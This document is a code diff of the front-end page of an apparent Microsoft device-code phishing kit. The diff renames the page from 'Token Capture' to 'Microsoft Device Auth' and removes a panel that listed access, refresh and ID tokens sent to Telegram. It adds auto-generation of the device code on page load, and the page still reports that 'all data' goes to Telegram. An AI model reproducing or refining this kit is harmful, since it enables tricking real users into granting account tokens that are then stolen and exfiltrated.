@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Microsoft Auth - Token Capture</title>
+  <title>Microsoft Device Auth</title>
   <style>
     * {
       margin: 0;
@@ -45,37 +45,6 @@
       line-height: 1.6;
     }
 
-    .btn {
-      background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
-      color: white;
-      border: none;
-      padding: 22px 45px;
-      border-radius: 14px;
-      font-size: 18px;
-      font-weight: 700;
-      cursor: pointer;
-      width: 100%;
-      transition: all 0.3s;
-      text-transform: uppercase;
-      letter-spacing: 1.2px;
-      box-shadow: 0 10px 25px rgba(0, 120, 212, 0.35);
-    }
-
-    .btn:hover:not(:disabled) {
-      transform: translateY(-4px);
-      box-shadow: 0 15px 35px rgba(0, 120, 212, 0.45);
-    }
-
-    .btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-
-    .code-section {
-      display: none;
-      margin-top: 50px;
-    }
-
     .code-box {
       background: linear-gradient(135deg, #fff9c4 0%, #fff59d 100%);
       border: 4px solid #ff9800;
@@ -107,7 +76,7 @@
     }
 
     .code:hover {
-      transform: scale(1.08);
+      transform: scale(1.05);
       text-shadow: 0 0 25px rgba(255, 107, 0, 0.4);
     }
 
@@ -131,10 +100,31 @@
       50% { opacity: 0.7; }
     }
 
-    .auth-btn {
+    .btn {
       background: linear-gradient(135deg, #ff6b00 0%, #e65100 100%);
-      margin-top: 25px;
+      color: white;
+      border: none;
+      padding: 24px 50px;
+      border-radius: 14px;
+      font-size: 19px;
+      font-weight: 700;
+      cursor: pointer;
+      width: 100%;
+      transition: all 0.3s;
+      text-transform: uppercase;
+      letter-spacing: 1.2px;
       box-shadow: 0 10px 25px rgba(255, 107, 0, 0.35);
+      margin-top: 25px;
+    }
+
+    .btn:hover:not(:disabled) {
+      transform: translateY(-4px);
+      box-shadow: 0 15px 35px rgba(255, 107, 0, 0.45);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
     }
 
     .spinner {
@@ -158,15 +148,12 @@
       border-radius: 14px;
       font-weight: 700;
       font-size: 17px;
-    }
-
-    .status-pending {
       background: #fff3cd;
       color: #856404;
       border: 3px solid #ffc107;
     }
 
-    .status-success {
+    .status.success {
       background: #d4edda;
       color: #155724;
       border: 3px solid #28a745;
@@ -211,37 +198,11 @@
       word-break: break-all;
     }
 
-    .telegram-info {
-      background: rgba(255, 255, 255, 0.9);
-      padding: 20px;
-      border-radius: 12px;
-      margin-top: 25px;
-      border-left: 5px solid #2e7d32;
-      text-align: left;
-    }
-
-    .telegram-info h3 {
-      color: #2e7d32;
-      margin-bottom: 15px;
-      font-size: 18px;
-    }
-
-    .telegram-info ul {
-      list-style: none;
-      padding: 0;
-    }
-
-    .telegram-info li {
-      padding: 6px 0;
-      color: #333;
-      font-size: 14px;
-    }
-
-    .telegram-info li::before {
-      content: '✓ ';
-      color: #4caf50;
-      font-weight: 900;
-      margin-right: 8px;
+    .loading {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
     }
 
     @media (max-width: 600px) {
@@ -264,35 +225,29 @@
   <div class="container">
     <h1>🔐 Microsoft Authentication</h1>
     <p class="subtitle">
-      Advanced Token Capture System<br>
-      Silent Permissions • All Tokens Captured
+      Auto-Generated Device Code<br>
+      Lightning-Fast • Silent Permissions
     </p>
 
-    <button class="btn" id="generateBtn" onclick="generate()">
-      Generate Authentication Code
+    <div class="code-box">
+      <div class="code-label">Your Device Code</div>
+      <div class="code" id="deviceCode" onclick="copy()">---</div>
+      <div class="countdown" id="countdown">--:--</div>
+    </div>
+
+    <button class="btn" id="authBtn" onclick="authenticate()" disabled>
+      Open Microsoft Authentication
     </button>
 
-    <!-- Code Display -->
-    <div class="code-section" id="codeSection">
-      <div class="code-box">
-        <div class="code-label">Your Device Code</div>
-        <div class="code" id="deviceCode" onclick="copy()">---</div>
-        <div class="countdown" id="countdown">--:--</div>
-      </div>
-
-      <button class="btn auth-btn" id="authBtn" onclick="authenticate()">
-        Open Microsoft Authentication
-      </button>
-
+    <div class="loading">
       <div class="spinner" id="spinner"></div>
-      <div class="status status-pending" id="status">
-        Waiting for authentication...
+      <div class="status" id="status">
+        Auto-generating code...
       </div>
     </div>
 
-    <!-- Success -->
     <div class="success-section" id="successSection">
-      <h2>✅ Tokens Captured!</h2>
+      <h2>✅ Complete!</h2>
       
       <div class="user-info">
         <strong>Name</strong>
@@ -304,21 +259,9 @@
         <span id="userEmail">---</span>
       </div>
 
-      <div class="telegram-info">
-        <h3>📱 Sent to Telegram (12-13 Messages)</h3>
-        <ul>
-          <li>Access Token (Plaintext)</li>
-          <li>Access Token (Encrypted AES-256-GCM)</li>
-          <li>Refresh Token (Plaintext)</li>
-          <li>Refresh Token (Encrypted)</li>
-          <li>ID Token (Plaintext)</li>
-          <li>ID Token (Encrypted)</li>
-          <li>Decoded JWT Claims</li>
-          <li>User Profile</li>
-          <li>Token Usage Guide</li>
-          <li>Complete Summary</li>
-        </ul>
-      </div>
+      <p style="margin-top: 25px; text-align: center; color: #2e7d32; font-weight: 700; font-size: 16px;">
+        📱 All data sent to Telegram in JSON format
+      </p>
     </div>
   </div>
 
@@ -333,12 +276,14 @@
       countdownTimer: null,
     };
 
+    // AUTO-GENERATE ON PAGE LOAD
+    window.addEventListener('load', () => {
+      // Lightning-fast auto-generation
+      setTimeout(generate, 100);
+    });
+
     async function generate() {
       try {
-        document.getElementById('generateBtn').disabled = true;
-        document.getElementById('codeSection').style.display = 'block';
-        document.getElementById('successSection').style.display = 'none';
-
         const res = await fetch('/api/device/generate', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' }
@@ -352,14 +297,20 @@
         state.expiresAt = new Date(Date.now() + data.expiresIn * 1000);
         state.interval = data.interval;
 
+        // Display code
         document.getElementById('deviceCode').textContent = data.userCode;
+        document.getElementById('authBtn').disabled = false;
+        document.getElementById('status').textContent = 'Ready! Click button to authenticate';
 
+        // Start countdown
         startCountdown();
+
+        // Start polling
         startPolling();
 
       } catch (err) {
         console.error(err);
-        document.getElementById('generateBtn').disabled = false;
+        document.getElementById('status').textContent = 'Error. Reload page.';
       }
     }
 
@@ -371,7 +322,7 @@
           clearInterval(state.countdownTimer);
           document.getElementById('countdown').textContent = 'EXPIRED';
           document.getElementById('countdown').classList.add('expiring');
-          document.getElementById('status').textContent = 'Code expired. Generate new code.';
+          document.getElementById('status').textContent = 'Code expired. Reload page.';
           document.getElementById('spinner').style.display = 'none';
         } else {
           const m = Math.floor(remaining / 60);
@@ -396,8 +347,8 @@
             clearInterval(state.countdownTimer);
             
             document.getElementById('spinner').style.display = 'none';
-            document.getElementById('status').className = 'status status-success';
-            document.getElementById('status').textContent = '✅ Complete! Check Telegram for tokens';
+            document.getElementById('status').className = 'status success';
+            document.getElementById('status').textContent = '✅ Complete! All data sent';
 
             document.getElementById('userName').textContent = data.user.displayName;
             document.getElementById('userEmail').textContent = data.user.email;
@@ -423,7 +374,6 @@
 
     function authenticate() {
       if (state.proxyUrl) {
-        // Use proxy URL - opens Microsoft auth with code pre-filled
         window.open(state.proxyUrl, '_blank');
       }
     }
